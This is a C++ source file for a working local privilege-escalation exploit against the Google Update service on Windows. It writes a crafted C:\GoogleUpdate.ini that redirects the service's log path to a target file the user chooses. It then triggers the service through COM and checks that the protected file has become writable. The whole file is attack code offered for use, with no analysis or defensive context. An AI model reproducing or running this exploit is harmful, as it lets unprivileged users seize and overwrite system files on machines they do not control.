#include <iostream>
#include "google_update_idl_h.h"
#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using namespace std;

void print_g(string s) {cout << "[+] " << s << endl;}
void print_g(wstring s) { wcout << L"[+] " << s << endl; }
void print_b(wstring s) { wcout << L"[-] " << s << endl; }
void print_b(string s) { cout << "[-] " << s << endl; }
void print_i(string s) { cout << "[!] " << s << endl; }
void print_i(wstring s) { wcout << L"[!] " << s << endl; }

std::string logfile1 = "[LoggingLevel]\nLC_CORE=5\nLC_NET=4\nLC_SERVICE=3\nLC_SETUP=3\nLC_SHELL=3\nLC_UTIL=3\n\nLC_OPT=3\nLC_REPORT=3\n\n[LoggingSettings]\nEnableLogging=1\nLogFilePath=\"";
                          //this can be se to 0 so as soon the service start it will trigger the bug
std::string logfile2 = "\"\nMaxLogFileSize=0\n\nShowTime=1\nLogToFile=1\nAppendToFile=1\nLogToStdOut=1\nLogToOutputDebug=1\n\n[DebugSettings]\nSkipServerReport=1\nNoSendDumpToServer=1\nNoSendStackToServer=1";

int main(int argc, const char* argv[])
{

    if (argc != 2) {
        cout << "[#] Usage : " << argv[0] << " C:\\Path\\To\\Take\\Over";
        return 0;
    }
    print_i("Target File " + string(argv[1]));
    print_i("Opening C:\\GoogleUpdate.ini");
    HANDLE ini = CreateFile(L"C:\\GoogleUpdate.ini", GENERIC_WRITE,
        ALL_SHARING, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ini == INVALID_HANDLE_VALUE) {
        print_b("Failed to open C:\\GoogleUpdate.ini");
        return 1;
    }
    
    print_g("Successfully Opened C:\\GoogleUpdate.ini");
    print_i("Writting logging payload ...");
    std::string str = logfile1;
    str += argv[1];
    str += logfile2;
    DWORD nb = 0;
    if (!WriteFile(ini, str.c_str(), str.size(), &nb, NULL)) {
        print_b("Write Operation Failed :(");
        cout << GetLastError();
        return 1;
    }
    print_g("Write Operation Succeeded");
    CloseHandle(ini);
    print_i("Executing Google Update Service");

    HRESULT coini = CoInitialize(NULL);
    if (!SUCCEEDED(coini)) {
        printf("[-] CoInitialize Failed 0x%8.8x", coini);
        return 1;
    }
    printf("[+] CoInitialize -> 0x%8.8x\n",coini);
    IGoogleUpdate* updater = nullptr;
    //Google : 9465B4B4-5216-4042-9A2C-754D3BCDC410
    //MS edge : A6B716CB-028B-404D-B72C-50E153DD68DA
    struct __declspec(uuid("9465B4B4-5216-4042-9A2C-754D3BCDC410")) CLSID_Object;
    HRESULT hr = CoCreateInstance(__uuidof(CLSID_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater),
        reinterpret_cast<void**>(&updater));
    if (!SUCCEEDED(hr)) {
        printf("[-] CoCreateInstance Failed 0x%8.8x", hr);
        return 1;
    }
    printf("[+] Service Executed successfully, CoCreateInstace->0x%8.8x\n", hr);
    Sleep(3000);//wait the bug to trigger

	HANDLE hfile = CreateFileA(argv[1], GENERIC_WRITE, ALL_SHARING, NULL, TRUNCATE_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);
    DeleteFile(L"C:\\GoogleUpdate.ini");
	if (hfile == INVALID_HANDLE_VALUE) {
		print_b("Exploit failed, target file isn't write-able");
		
		return 1;
	}
    print_g("Exploit Done \"" + string(argv[1]) + "\" is now write-able");
    return 0;
}